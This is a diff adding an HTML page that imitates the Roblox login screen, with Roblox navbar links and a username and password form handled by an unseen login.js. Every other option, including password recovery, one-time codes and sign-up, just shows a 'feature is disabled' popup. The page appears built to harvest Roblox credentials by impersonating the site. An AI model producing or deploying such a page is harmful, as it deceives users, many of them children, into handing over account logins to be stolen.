@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to Roblox</title>
+    <link rel="stylesheet" href="style.css">
+    <script defer src="login.js"></script>
+</head>
+<body>
+    <div class="navbar">
+        <a href="https://www.roblox.com/discover" class="nav-link">Marketplace</a>
+        <a href="https://www.roblox.com/create" class="nav-link">Create</a>
+        <a href="https://www.roblox.com/upgrades/robux" class="nav-link">Robux</a>
+        <input type="text" placeholder="Search..." class="search-bar">
+    </div>
+
+    <div class="login-container">
+        <h2>Login to Roblox</h2>
+        <form id="login-form">
+            <input type="text" id="username" placeholder="Username/Email/Phone" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" class="login-btn">Log In</button>
+        </form>
+        <a href="#" class="forgot-link" onclick="showPopup()">Forgot Password or Username?</a>
+        <button class="email-code-btn" onclick="showPopup()">Email Me a One-Time Code</button>
+        <button class="use-device-btn" onclick="showPopup()">Use Another Device</button>
+        <p>Don't have an account? <a href="#" class="signup-link" onclick="showPopup()">Sign Up</a></p>
+    </div>
+
+    <!-- Pop-up Message -->
+    <div id="popup" class="popup">
+        <div class="popup-content">
+            <p>Sorry, this feature is disabled at this moment.</p>
+            <button onclick="closePopup()">OK</button>
+        </div>
+    </div>
+</body>
+</html>
